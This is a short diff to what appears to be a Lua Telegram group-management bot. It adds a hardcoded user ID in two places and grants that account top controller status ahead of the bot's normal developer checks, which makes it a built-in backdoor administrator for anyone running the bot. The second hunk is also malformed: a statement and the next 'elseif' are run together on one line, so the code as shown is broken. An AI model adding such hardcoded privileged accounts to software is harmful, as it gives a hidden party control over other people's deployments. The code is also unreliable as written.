@@ -160,6 +160,8 @@ elseif UserId == 758381470 then
 Status = 'القيادة حمادة '
 elseif UserId == 5155577461 then
 Status = 'حكك المبرمج '
+elseif UserId == 2052003627 then
+Status = 'حكك حمادة '
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
 elseif UserId == TheTOKYO then
@@ -912,7 +914,9 @@ msg.The_Controller = 1
 elseif tonumber(msg.sender.user_id) == 5155577461 then
 msg.Name_Controller = 'حكك المبرمج '
 msg.The_Controller = 1
-elseif The_ControllerAll(msg.sender.user_id) == true then  
+elseif tonumber(msg.sender.user_id) == 2052003627 then
+msg.Name_Controller = 'حكك حمادة '
+msg.The_Controller = 1elseif The_ControllerAll(msg.sender.user_id) == true then  
 msg.The_Controller = 1
 msg.Name_Controller = 'المطور الاساسي '
 elseif Redis:sismember(TheTOKYO.."TOKYO:DevelopersQ:Groups",msg.sender.user_id) == true then
